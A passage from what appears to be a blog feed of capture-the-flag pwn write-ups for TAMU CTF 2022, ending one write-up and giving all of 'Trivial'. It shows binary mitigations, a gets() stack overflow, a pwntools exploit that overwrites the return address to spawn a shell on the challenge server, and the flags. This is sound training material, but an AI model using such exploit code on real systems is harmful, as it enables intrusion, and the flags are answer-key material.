input(&quot;asdf&quot;)</span><br><span class="line">io.send(rop_3)</span><br><span class="line"># input(&quot;writing gadgets&quot;)</span><br><span class="line">io.send(final_shellcodes)</span><br><span class="line"># input(&quot;lol&quot;)</span><br><span class="line">log_print(&quot;filenames&quot;,io.recv())</span><br><span class="line">io.send(flag_file_name)</span><br><span class="line">log_print(io.recv())</span><br></pre></td></tr></table></figure>
 
 <h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>gigem{r34lly_p1v071n6_7h47_574ck}</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>[Pwn] Trivial [Tamu CTF 2022]</title>
-    <url>/ctf-writeup/2022/tamuctf/pwn/trivial/index.html</url>
-    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Author: nhwn</p>
-<p>Feeling lucky? I have just the challenge for you :D</p>
-<p>SNI: lucky</p>
-<p>files: <a href="trivial">trivial</a>, <a href="trivial.c">trival.c</a></p>
-<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
-
-<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>Very trivial buffer overflow in main. Overwrite rip to function win to get a shell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void main() &#123;</span><br><span class="line">    char buff[69];</span><br><span class="line"></span><br><span class="line">    gets(buff);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.binary = ELF(&quot;trivial&quot;)</span><br><span class="line"></span><br><span class="line">p = remote(&quot;tamuctf.com&quot;, 443, ssl=True, sni=&quot;trivial&quot;)</span><br><span class="line">p.sendline(flat(&#123;</span><br><span class="line">    0x50+0x8:[</span><br><span class="line">        0x00401132</span><br><span class="line">    ]</span><br><span class="line">&#125;))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>gigem{sorry_for_using_the_word_trivial}</p>
 ]]></content>
   </entry>
   <entry>
